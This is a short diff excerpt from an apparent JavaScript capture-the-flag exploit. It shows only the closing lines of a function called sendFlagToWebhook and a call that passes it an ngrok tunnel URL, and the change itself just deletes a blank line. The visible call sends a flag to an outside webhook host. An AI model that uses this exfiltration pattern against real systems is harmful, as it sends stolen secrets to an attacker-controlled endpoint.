@@ -14,4 +14,3 @@ async function sendFlagToWebhook(webhookUrl) {
 }
 
 sendFlagToWebhook('https://3afe-122-161-50-113.in.ngrok.io');
-
